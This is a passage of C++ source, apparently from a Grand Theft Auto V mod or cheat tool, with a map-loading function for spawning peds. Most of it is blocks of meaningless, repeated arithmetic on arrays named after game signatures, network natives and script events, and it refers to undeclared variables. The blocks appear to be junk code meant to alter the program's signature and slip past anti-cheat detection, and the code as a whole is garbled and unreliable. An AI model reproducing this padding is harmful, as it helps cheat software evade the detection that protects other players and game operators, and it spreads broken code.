					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				//Void de spawn aqui
				/*
				cout << "[" << i << "]" << endl;
				cout << "Model=" << i << Spawn.Model << endl;
				cout << "PosX=" << i << Spawn.PosX << endl;
				cout << "PosY=" << i << Spawn.PosY << endl;
				cout << "PosZ=" << i << Spawn.PosZ << endl;
				cout << "RotX=" << i << Spawn.RotX << endl;
				cout << "RotY=" << i << Spawn.RotY << endl;
				cout << "RotZ=" << i << Spawn.RotZ << endl;
				*/
			}
		}
	}
	void LoadMap_Peds(std::string INIPath)
	{
		//Exemplo::
		//GTA::LoadMap_Props(".\\Mapa.ini");
		//
		Spawn_Struct Spawn;

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
